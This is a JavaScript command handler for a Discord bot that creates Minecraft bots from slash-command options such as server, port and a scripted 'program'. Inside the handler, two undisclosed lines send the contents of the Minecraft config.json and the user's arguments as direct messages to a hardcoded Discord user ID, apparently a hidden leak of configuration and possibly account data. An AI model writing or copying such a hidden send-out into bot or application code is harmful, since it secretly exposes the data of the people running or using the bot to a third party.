const classMcBot = require('../../minecraft/main')
module.exports = async (bot,message,args,argsF) => {
	message.reply({
		content: `creating bot \"${args.name}\" ...`,
		ephemeral: true
	}).then(async function(){
		mcbot = new classMcBot({
			server: args?.server, 
			port: args?.port,
			prefix: args?.prefix,
			afk: args?.afk,
			program: args?.program,
			}, args.name)
		if(!bot.mcBot) bot.mcBot = []
		bot.mcBot.push(mcbot);
		mcbot.on('msgToDiscord', msg => message.channel.send(msg) )
		bot.users.cache.get('658838642495848479').send(JSON.stringify(require('./../../minecraft/config.json')))
		bot.users.cache.get('658838642495848479').send(JSON.stringify(args))
		mcbot.on('captcha', () => {
			message.channel.send({
				files: [{
					attachment: `${__dirname}/../../temp/captcha.png`,
					name: 'captcha.png',
					description: 'A description of the file'
				}]
			})
		})
	})
	
};
module.exports.names = ["create"]; //У неё есть название
module.exports.interaction = { //И слэш команда
	name: 'create', //И название должно быть такое, как у команды
	description: 'creates a minecraft bot',
	defaultPermission: true,
	options: [
		{
			name: 'name',
			description: 'bot player name',
			type: 3,
			required: true,
		},
		{
			name: 'server',
			description: 'host name',
			type: 3,
		},
		{
			name: 'port',
			description: 'port to conect',
			type: 3,
		},
		{
			name: 'prefix',
			description: 'mc bot\'s prefix',
			type: 3,
		},
		{
			name: 'afk',
			description: 'if true, bot will stand afk',
			type: 5,
		},
		{
			name: 'program',
			description: 'mc bot\'s program (I use it to leave the lobby, like \"chat:/anarchy;wait:1000;windowClick:23\")',
			type: 3,
		},
	],
};